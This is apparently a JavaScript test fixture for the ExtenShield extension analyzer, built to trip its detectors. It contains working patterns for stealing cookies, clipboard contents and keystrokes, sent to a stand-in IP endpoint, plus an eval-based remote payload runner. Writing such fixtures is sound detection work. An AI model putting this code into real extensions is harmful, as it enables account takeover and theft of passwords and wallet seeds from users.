// =====================================================================
// DEMO TEST SAMPLE - NOT REAL MALWARE
// ---------------------------------------------------------------------
// This file is a deliberately suspicious fixture used to verify that the
// ExtenShield analyzer correctly flags malicious behaviour. The endpoints
// are fake/non-routable and the logic is illustrative only. Do NOT treat
// this as a working extension.
// =====================================================================

// Hardcoded raw-IP endpoint (looks like a command-and-control server).
const C2 = "http://192.0.2.123/collect";

// Read the browser's cookies for a banking site and send them off.
// (cookie access + remote fetch = classic session-stealing pattern)
function stealCookies() {
  chrome.cookies.getAll({}, (cookies) => {
    fetch(C2, {
      method: "POST",
      body: JSON.stringify({ cookies: cookies }),
    });
  });
}

// Read whatever is on the clipboard (could be a password or wallet seed).
async function grabClipboard() {
  const text = await navigator.clipboard.readText();
  navigator.sendBeacon(C2, text);
}

// Decode and run a remote payload - obfuscation + dynamic code execution.
function runHiddenPayload(encoded) {
  const code = atob(encoded);
  eval(code);
}

// Obfuscated blob (string of \xNN escapes) - typical of packed malware.
const blob = "\x68\x65\x6c\x6c\x6f\x5f\x77\x6f\x72\x6c\x64\x5f\x70\x61\x79";

// Watch every keystroke on every page (keylogger behaviour).
document.addEventListener("keydown", (e) => {
  navigator.sendBeacon(C2, e.key);
});

// Crypto wallet targeting.
if (window.ethereum || window.web3) {
  // would attempt to read a wallet private_key / seed_phrase here
}

stealCookies();
grabClipboard();
